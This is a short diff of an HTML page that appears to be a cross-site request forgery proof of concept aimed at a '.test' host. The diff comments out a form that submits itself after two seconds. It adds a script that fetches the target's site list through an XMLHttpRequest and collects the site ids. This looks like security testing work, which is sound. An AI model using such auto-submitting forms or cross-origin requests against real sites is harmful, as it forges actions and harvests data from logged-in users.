@@ -14,9 +14,23 @@
 
 
     <script>
-      setTimeout(function(){
-        document.getElementById("csrf-form").submit();
-      }, 2000)
+      function httpGetAsync(theUrl, callback) {
+          var xmlHttp = new XMLHttpRequest();
+          xmlHttp.onreadystatechange = function() { 
+              if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
+                  callback(xmlHttp.responseText);
+          }
+          xmlHttp.open("GET", theUrl, true); // true for asynchronous 
+          xmlHttp.send(null);
+      }
+      httpGetAsync('https://tommy-design.test/api/weba/v3/site?offset=0&limit=20&title=', (res) => {
+        const sites = JSON.parse(res).sites; 
+        sites_id_arr = sites.map(site => site._id)
+        console.log('sites_id_arr', sites_id_arr)
+      })
+      // setTimeout(function(){
+      //   document.getElementById("csrf-form").submit();
+      // }, 2000)
     </script>
   </body>
 
